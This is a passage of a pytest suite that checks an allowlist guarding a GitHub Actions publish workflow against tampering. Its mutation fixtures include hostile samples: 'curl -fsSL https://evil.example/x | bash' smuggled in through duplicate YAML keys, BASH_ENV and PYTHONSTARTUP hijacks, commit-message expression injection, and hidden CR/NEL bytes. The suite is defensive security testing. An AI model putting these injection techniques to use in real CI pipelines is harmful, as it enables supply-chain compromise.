        steps = _steps(workflow)
        names = [step["name"] for step in steps]
        i, j = names.index(first), names.index(second)
        steps[i], steps[j] = steps[j], steps[i]

    return mutate


STRUCTURAL_MUTATIONS = {
    # Order within a step (passes a per-step set check, fails the sequence).
    "break-before-health-check": _edit_lines(
        VERIFY,
        lambda lines: lines.insert(lines.index(HEALTH_LINE), lines.pop(lines.index(BREAK_LINE))),
    ),
    "test-before-promote": _edit_lines(
        PROMOTE_STEP, lambda lines: lines.insert(0, lines.pop(lines.index(DIGEST_TEST_LINE)))
    ),
    "duplicate-pull": _edit_lines(VERIFY, lambda lines: lines.insert(0, lines[0])),
    "duplicate-promote": _edit_lines(
        PROMOTE_STEP, lambda lines: lines.__setitem__(slice(0, 0), PROMOTE_COMMAND)
    ),
    "missing-digest-test": _edit_lines(PROMOTE_STEP, lambda lines: lines.remove(DIGEST_TEST_LINE)),
    "missing-exit-in-refuse": _edit_lines(REFUSE, lambda lines: lines.remove("  exit 1")),
    "missing-health-check": _edit_lines(
        VERIFY, lambda lines: [lines.remove(line) for line in HEALTH_COMMAND]
    ),
    "emptied-script": _edit_lines(REMOVE, lambda lines: lines.clear()),
    "missing-final-newline": _edit_lines(PROMOTE_STEP, lambda lines: lines.pop()),
    # Promote injected into another step (cross-step).
    "promote-in-verify": _edit_lines(
        VERIFY, lambda lines: lines.__setitem__(slice(6, 6), PROMOTE_COMMAND)
    ),
    "promote-in-reread": _edit_lines(
        REREAD, lambda lines: lines.__setitem__(slice(-1, -1), PROMOTE_COMMAND)
    ),
    # Steps added, removed, renamed, duplicated, reordered.
    "new-bash-step": lambda workflow: _steps(workflow).insert(
        3, {"name": "Debug", "shell": "bash", "run": "docker logs ghidra-mcp-ci\n"}
    ),
    "removed-bash-step": lambda workflow: _steps(workflow).pop(),
    "renamed-bash-step": _set(REMOVE, "name", "Remove the verification container"),
    "duplicated-bash-step": lambda workflow: _steps(workflow).append(
        dict(_publish_step(workflow, REMOVE))
    ),
    "promote-before-verify": _swap_steps(VERIFY, PROMOTE_STEP),
    "remove-before-verify": _swap_steps(VERIFY, REMOVE),
    "verify-replaced-by-pinned-action": lambda workflow: _steps(workflow).__setitem__(
        PUBLISH_STEP_NAMES.index(VERIFY),
        {"name": VERIFY, "uses": sorted(ALLOWED_PUBLISH_ACTIONS)[0]},
    ),
    # Characters str.strip() would remove but bash does not treat as blanks.
    "leading-vertical-tab": _edit_lines(
        REMOVE, lambda lines: lines.__setitem__(0, "\x0b" + lines[0])
    ),
    "leading-file-separator": _edit_lines(
        REMOVE, lambda lines: lines.__setitem__(0, "\x1c" + lines[0])
    ),
    "trailing-nbsp": _edit_lines(REMOVE, lambda lines: lines.__setitem__(0, lines[0] + "\xa0")),
    "run-is-a-list": _set(REMOVE, "run", ["docker rm -f ghidra-mcp-ci 2>/dev/null || true"]),
    # shell / env / if / id / timeout-minutes frozen, including "absent".
    "shell-sh": _set(VERIFY, "shell", "sh"),
    "shell-bash-x": _set(VERIFY, "shell", "bash -x {0}"),
    "shell-removed": _drop(VERIFY, "shell"),
    "shell-added-to-remove": _set(REMOVE, "shell", "bash"),
    "bash-env-on-verify": _set(VERIFY, "env", {"BASH_ENV": "/tmp/evil"}),
    "env-on-remove": _set(REMOVE, "env", {"BASH_ENV": "/tmp/evil"}),
    "empty-env-on-promote": _set(PROMOTE_STEP, "env", {}),
    "extra-env-on-reread": lambda workflow: _publish_step(workflow, REREAD)["env"].update(
        BASH_ENV="/tmp/evil"
    ),
    "changed-env-on-reread": lambda workflow: _publish_step(workflow, REREAD)["env"].update(
        TESTED_VERSION="${{ github.event.head_commit.message }}"
    ),
    "if-always-on-promote": _set(PROMOTE_STEP, "if", "always()"),
    "if-removed-from-remove": _drop(REMOVE, "if"),
    "if-changed-on-remove": _set(REMOVE, "if", "success()"),
    "id-changed-on-reread": _set(REREAD, "id", "v"),
    "id-added-to-verify": _set(VERIFY, "id", "verify"),
    "timeout-added-to-verify": _set(VERIFY, "timeout-minutes", 5),
    "working-directory": _set(VERIFY, "working-directory", "/tmp"),
    "continue-on-error": _set(VERIFY, "continue-on-error", True),
    "with-on-run-step": _set(VERIFY, "with", {"x": "y"}),
    # The version check: shell fields and the pinned script hash.
    "version-check-timeout-changed": _set(VERSION_CHECK, "timeout-minutes", 6),
    "version-check-timeout-as-string": _set(VERSION_CHECK, "timeout-minutes", "5"),
    "version-check-timeout-as-float": _set(VERSION_CHECK, "timeout-minutes", 5.0),
    "version-check-shell-bash": _set(VERSION_CHECK, "shell", "bash"),
    "version-check-extra-env": lambda workflow: _publish_step(workflow, VERSION_CHECK)[
        "env"
    ].update(PYTHONSTARTUP="/tmp/evil.py"),
    "version-check-script-edited": lambda workflow: _publish_step(
        workflow, VERSION_CHECK
    ).__setitem__("run", _publish_step(workflow, VERSION_CHECK)["run"] + "import os\n"),
    "version-check-script-whitespace": lambda workflow: _publish_step(
        workflow, VERSION_CHECK
    ).__setitem__("run", _publish_step(workflow, VERSION_CHECK)["run"] + "\n"),
    "version-check-id-added": _set(VERSION_CHECK, "id", "check"),
    # Workflow- and job-level settings that change how every bash step runs.
    "workflow-defaults": lambda workflow: workflow.update(defaults={"run": {"shell": "sh {0}"}}),
    "job-defaults": lambda workflow: workflow["jobs"]["publish"].update(
        defaults={"run": {"shell": "sh {0}"}}
    ),
    "job-bash-env": lambda workflow: workflow["jobs"]["publish"].update(
        env={"BASH_ENV": "/tmp/evil"}
    ),
    "workflow-bash-env": lambda workflow: workflow["env"].update(BASH_ENV="/tmp/evil"),
    "workflow-image-name": lambda workflow: workflow["env"].update(IMAGE_NAME="ghcr.io/evil/x"),
    "job-container": lambda workflow: workflow["jobs"]["publish"].update(container="alpine"),
}


@pytest.mark.parametrize(
    "mutate", [pytest.param(mutate, id=name) for name, mutate in STRUCTURAL_MUTATIONS.items()]
)
def test_publish_allowlist_rejects_structural_mutations(mutate: Any) -> None:
    workflow = copy.deepcopy(_workflow())
    assert _publish_problems(workflow) == []
    mutate(workflow)
    assert _publish_problems(workflow)


def test_publish_allowlist_sequence_check_catches_what_a_set_check_misses() -> None:
    # Moving `break` above the health check keeps every line in the step's set
    # but skips verification; only the ordered comparison rejects it.
    workflow = copy.deepcopy(_workflow())
    STRUCTURAL_MUTATIONS["break-before-health-check"](workflow)
    run = _publish_step(workflow, VERIFY)["run"]
    assert set(_physical_lines(run)) == set(PUBLISH_RUN_LINES[VERIFY])
    assert _line_problems(run) == []
    assert _publish_problems(workflow) == [
        f"{VERIFY}: lines differ from the frozen sequence (order, duplicate or missing)"
    ]


def test_publish_steps_cannot_be_forced_past_a_failure() -> None:
    workflow = _workflow()
    for job_name, job in workflow["jobs"].items():
        assert "if" not in job, job_name
        assert "continue-on-error" not in job, job_name
    for step in _jobs()["publish"]:
        assert "continue-on-error" not in step.raw, step.name
        if step.name.startswith("Remove "):
            assert step.raw.get("if") == "always()", step.name
        else:
            assert "if" not in step.raw, (step.name, step.raw.get("if"))
    for step in _jobs()["test"]:
        assert "continue-on-error" not in step.raw, step.name
        assert "if" not in step.raw or (
            step.name.startswith("Remove ") and step.raw["if"] == "always()"
        ), step.name


def test_release_test_job_really_runs_the_container_e2e_test() -> None:
    step = _step("test", "Run container MCP end-to-end test")
    assert step.run is not None
    commands = _commands(step.run)

    pytest_line = commands.index(
        ".ci-venv/bin/uv run pytest tests/integration/test_container_mcp.py"
    )
    assert commands[pytest_line - 2].startswith(
        "GHIDRA_MCP_CONTAINER_URL=http://127.0.0.1:8765/mcp"
    )
    assert commands[pytest_line - 1].startswith('GHIDRA_MCP_CONTAINER_TOKEN="$TOKEN"')
    assert any(line.startswith("ghidra-mcp-release-test:local") for line in commands)


def test_release_jobs_have_timeouts() -> None:
    jobs = _workflow()["jobs"]

    assert set(jobs) == {"test", "publish"}
    assert all(10 <= job["timeout-minutes"] <= 60 for job in jobs.values())
    assert 1 <= _step("publish", VERSION_CHECK).raw["timeout-minutes"] <= 10


def test_publish_allowlist_reports_a_line_moved_to_another_step() -> None:
    # Promoting from inside the Verify step, before the health check, is reported
    # both as a line foreign to that step and as a broken sequence.
    workflow = copy.deepcopy(_workflow())
    STRUCTURAL_MUTATIONS["promote-in-verify"](workflow)
    # The last physical line of the promote command (the candidate image) is also a
    # line of Verify, so only the sequence check reports it.
    assert _publish_problems(workflow) == [
        f"{VERIFY}: line 6 is not allowlisted for this step: {PROMOTE_COMMAND[0]}",
        f"{VERIFY}: line 7 is not allowlisted for this step: {PROMOTE_COMMAND[1]}",
        f"{VERIFY}: line 8 is not allowlisted for this step: {PROMOTE_COMMAND[2]}",
        f"{VERIFY}: lines differ from the frozen sequence (order, duplicate or missing)",
    ]


def test_publish_line_allowlist_never_joins_continuations() -> None:
    # Both were accepted by the SAF-50 normalisation (the first one was the only
    # accepted shape); with physical lines neither is a frozen line.
    assert _line_problems("docker rm -f \\\n    ghidra-mcp-ci 2>/dev/null || true")
    assert _line_problems("docker rm -f\\\n    ghidra-mcp-ci 2>/dev/null || true")
    # The joined form of a frozen multi-line command is not a frozen line either.
    joined = " ".join(line.strip().removesuffix(" \\") for line in PROMOTE_COMMAND)
    assert _line_problems(joined) == [f"not allowlisted: {joined}"]


# --- R1: continuations and whitespace inside quotes and `${{ }}` (PR #19 review). ---


def _with_step_run(name: str, run: str) -> dict[str, Any]:
    workflow = copy.deepcopy(_workflow())
    _publish_step(workflow, name)["run"] = run
    return workflow


def _split_at(name: str, line: str, fragment: str) -> str:
    """The step's script with ` \\<newline>` plus the line's indentation inserted after
    `fragment` (which must end right before a blank) in `line`."""
    frozen = PUBLISH_RUN_LINES[name]
    assert frozen.count(line) == 1, line
    head, blank, tail = line.partition(fragment + " ")
    assert blank, (fragment, line)
    indent = line[: len(line) - len(line.lstrip(" "))]
    index = frozen.index(line)
    split = (head + fragment + " \\", indent + "  " + tail)
    return "\n".join((*frozen[:index], *split, *frozen[index + 1 :]))


R1_LINE_IN_REREAD = PUBLISH_RUN_LINES[REREAD][3]
R1_LINE_IN_REFUSE = PUBLISH_RUN_LINES[REFUSE][5]
R1_SPLITS = {
    # Each split was mapped back onto the frozen logical line by the SAF-50 join.
    "unquoted": (VERIFY, PUBLISH_RUN_LINES[VERIFY][0], "docker pull"),
    "inside-command-substitution": (VERIFY, PUBLISH_RUN_LINES[VERIFY][1], 'TOKEN="$(openssl rand'),
    "double-quoted": (REREAD, R1_LINE_IN_REREAD, '  echo "VERSION $VERSION does not'),
    "single-quoted-grep-pattern": (REFUSE, R1_LINE_IN_REFUSE, "if ! grep -Eqi 'manifest"),
    "single-quoted-python": (VERIFY, HEALTH_LINE, "    python3 -c 'import json,sys;"),
    "single-quoted-go-template": (
        PROMOTE_STEP,
        PUBLISH_RUN_LINES[PROMOTE_STEP][6],
        "  --format '{{json",
    ),
    # The `${{ }}` category the SAF-50 residual analysis missed: Actions, not bash,
    # reads this text, and a backslash inside an expression is a lexing error there.
    "inside-expression-after-open": (
        VERIFY,
        PUBLISH_RUN_LINES[VERIFY][0],
        'docker pull "${IMAGE_NAME}@${{',
    ),
    "inside-expression-before-close": (
        PROMOTE_STEP,
        DIGEST_TEST_LINE,
        'test "$VERSION_DIGEST" = "${{ steps.image.outputs.digest',
    ),
    "inside-expression-in-health-arguments": (
        VERIFY,
        PUBLISH_RUN_LINES[VERIFY][11],
        '      "${{ steps.version.outputs.value }}" "${{ github.sha',
    ),
}


@pytest.mark.parametrize(
    ("name", "line", "fragment"),
    [pytest.param(*case, id=case_id) for case_id, case in R1_SPLITS.items()],
)
def test_publish_allowlist_rejects_a_continuation_inside_a_frozen_line(
    name: str, line: str, fragment: str
) -> None:
    problems = _publish_problems(_with_step_run(name, _split_at(name, line, fragment)))
    assert any("is not allowlisted for this step" in problem for problem in problems), problems


def test_publish_allowlist_rejects_a_continuation_at_every_blank() -> None:
    # Exhaustive form of R1: every blank of every frozen line (unquoted, quoted,
    # inside `$( )` or `${{ }}`) replaced by ` \\<newline>  `.
    cases = 0
    for name, frozen in PUBLISH_RUN_LINES.items():
        for index, line in enumerate(frozen):
            for column, character in enumerate(line):
                if character != " " or not line[:column].strip():
                    continue
                split = (line[:column] + " \\", "  " + line[column + 1 :])
                run = "\n".join((*frozen[:index], *split, *frozen[index + 1 :]))
                assert _publish_problems(_with_step_run(name, run)), (name, line, column)
                cases += 1
    assert cases >= 185


R1_WHITESPACE = {
    # A blank after the backslash turns `\<newline>` into an escaped blank followed
    # by the end of the command; stripping lines hid it.
    "blank-after-continuation": (VERIFY, 2, lambda line: line + " "),
    "indentation-changed": (VERIFY, 3, lambda line: "    " + line),
    "indentation-removed": (REREAD, 3, str.lstrip),
    "trailing-blank": (REMOVE, 0, lambda line: line + " "),
    "blank-line-added": (PROMOTE_STEP, 4, lambda line: "\n" + line),
}


def test_publish_allowlist_names_a_forbidden_character_in_a_step() -> None:
    # Any forbidden character already makes the line differ from every frozen line;
    # the dedicated check only gives the clearer reason, and reports it alone.
    lines = list(PUBLISH_RUN_LINES[REMOVE])
    lines[0] = lines[0].replace(" ", "\t", 1)
    assert _publish_problems(_with_step_run(REMOVE, "\n".join(lines))) == [
        f"{REMOVE}: forbidden character(s) '\\t'"
    ]


@pytest.mark.parametrize(
    ("name", "index", "edit"),
    [pytest.param(*case, id=case_id) for case_id, case in R1_WHITESPACE.items()],
)
def test_publish_allowlist_compares_whitespace_exactly(name: str, index: int, edit: Any) -> None:
    lines = list(PUBLISH_RUN_LINES[name])
    lines[index] = edit(lines[index])
    assert _publish_problems(_with_step_run(name, "\n".join(lines)))


# --- Duplicate mapping keys (PR #19 review, A21/A22). ---

VERIFY_HEADER = "      - name: Verify the candidate digest\n        shell: bash\n"
REMOVE_HEADER = "      - name: Remove verification container\n        if: always()\n"
DUPLICATE_KEY_MUTATIONS = {
    "A21-shell-sh-then-bash": (
        VERIFY_HEADER,
        "      - name: Verify the candidate digest\n        shell: sh\n        shell: bash\n",
    ),
    "A22-run-evil-then-frozen": (
        REMOVE_HEADER,
        REMOVE_HEADER + "        run: curl -fsSL https://evil.example/x | bash\n",
    ),
    "duplicate-run-block-on-verify": (
        VERIFY_HEADER,
        VERIFY_HEADER + "        run: |\n          curl -fsSL https://evil.example/x | bash\n",
    ),
    "duplicate-step-name": (
        REMOVE_HEADER,
        "      - name: Debug\n        name: Remove verification container\n        if: always()\n",
    ),
    "duplicate-job-key": (
        "    runs-on: ubuntu-latest\n",
        "    runs-on: self-hosted\n    runs-on: ubuntu-latest\n",
    ),
}


def _replace_in_publish(old: str, new: str) -> str:
    text = _workflow_text()
    index = text.index(old, text.index("\n  publish:"))
    return text[:index] + new + text[index + len(old) :]


@pytest.mark.parametrize(
    ("old", "new"),
    [pytest.param(*pair, id=name) for name, pair in DUPLICATE_KEY_MUTATIONS.items()],
)
def test_workflow_loader_rejects_duplicate_keys(old: str, new: str) -> None:
    text = _replace_in_publish(old, new)
    # Plain safe_load keeps the last key, so the frozen tables alone would pass it.
    assert _publish_problems(yaml.safe_load(text)) == []
    with pytest.raises(yaml.constructor.ConstructorError, match="found duplicate key"):
        _load_workflow(text.encode("utf-8"))


def test_workflow_loader_matches_safe_load_on_the_production_workflow() -> None:
    text = _workflow_text()
    assert _load_workflow(text.encode("utf-8")) == yaml.safe_load(text)


# --- Raw bytes: CR, NEL and non-ASCII before YAML parsing (PR #19 review). ---

REFUSE_BREAK = "            exit 1\n          fi\n          if ! grep"
RAW_MUTATIONS = {
    # case: (old, new, invisible once a YAML loader has normalised line breaks)
    "C01-nel-between-lines": (
        REFUSE_BREAK,
        REFUSE_BREAK.replace("exit 1\n", "exit 1\x85", 1),
        True,
    ),
    "C03-cr-only-line-break": (
        REFUSE_BREAK,
        REFUSE_BREAK.replace("exit 1\n", "exit 1\r", 1),
        True,
    ),
    "crlf-line-break-in-run": (
        "docker logs ghidra-mcp-ci\n",
        "docker logs ghidra-mcp-ci\r\n",
        True,
    ),
    "C02-line-separator": (
        REFUSE_BREAK,
        REFUSE_BREAK.replace("exit 1\n", "exit 1\u2028", 1),
        False,
    ),
    "non-ascii-in-a-comment": (
        "  # Only this job can write packages.",
        "  # Only this job can write packages.\u00a0",
        True,
    ),
}


def _raw_mutation(old: str, new: str) -> bytes:
    text = _workflow_text()
    assert text.count(old) >= 1, old
    return text.replace(old, new, 1).encode("utf-8")


@pytest.mark.parametrize(
    ("old", "new", "invisible"),
    [pytest.param(*case, id=case_id) for case_id, case in RAW_MUTATIONS.items()],
)
def test_raw_workflow_bytes_are_checked_before_yaml_parsing(
    old: str, new: str, invisible: bool
) -> None:
    raw = _raw_mutation(old, new)
    assert _raw_workflow_problems(raw)
    with pytest.raises(WorkflowBytesError):
        _load_workflow(raw)
    if invisible:
        # What the allowlist alone sees after safe_load: nothing to reject.
        assert _publish_problems(yaml.safe_load(raw.decode("utf-8"))) == []


def test_raw_workflow_check_names_each_problem() -> None:
    assert _raw_workflow_problems(b"a: 1\r\n") == ["raw workflow contains CR (\\r)"]
    assert _raw_workflow_problems("a: 1\x85".encode("latin-1")) == [
        "raw workflow contains a NEL byte (\\x85)",
        "raw workflow contains non-ASCII bytes 0x85",
    ]
    assert _raw_workflow_problems("a: \u00e9\n".encode("utf-8")) == [
        "raw workflow contains non-ASCII bytes 0xa9, 0xc3"
    ]
    whole_file_crlf = _workflow_text().replace("\n", "\r\n").encode("ascii")
    assert _raw_workflow_problems(whole_file_crlf) == ["raw workflow contains CR (\\r)"]
    assert _raw_workflow_problems(WORKFLOW.read_bytes()) == []
